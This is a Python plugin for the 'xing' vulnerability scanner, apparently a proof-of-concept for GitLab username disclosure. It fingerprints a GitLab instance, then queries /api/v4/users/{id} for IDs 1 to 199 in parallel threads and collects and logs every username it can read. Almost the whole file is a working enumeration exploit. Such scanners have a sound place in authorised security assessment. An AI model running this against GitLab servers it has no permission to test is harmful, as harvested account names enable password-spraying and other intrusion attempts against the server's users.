import json
from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req
from xing.core import PluginType, SchemeType, thread_map


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Gitlab 用户名泄漏"
        self.app_name = 'Gitlab'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        """较严格判断是否是Gitlab"""

        url = target + "/explore/projects"
        conn = http_req(url, "get")

        if b"GitLab" not in conn.content:
            return False

        if b'authenticity_token' not in conn.content:
            return False

        try:
            url = target + "/api/v4/users/1"
            conn = http_req(url, "get")
            data = conn.json()
            if not isinstance(data, dict):
                return False
            if (not data.get("message")) and (not data.get("username")):
                return False
        except json.decoder.JSONDecodeError as e:
            return

        users = self.gen_users()
        if users:
            self.logger.success("found {} users {} {}".format(target, len(users), users))
        
        # 返回string ，前端显示有点问题。 
        return ",".join(users)

    def _get_user(self, uid):
        url = "{}/api/v4/users/{}".format(self.target, uid)
        self.logger.debug("req >>> {}".format(url))
        conn = http_req(url, "get")
        data = conn.json()
        #if data.get("state") == "active":
        return data.get("username")

    def gen_users(self):
        self.logger.info("start get gitlab users >>> {}".format(self.target))
        items = list(range(1, 200))
        result_map = thread_map(fun=self._get_user, items=items)
        return list(result_map.values())
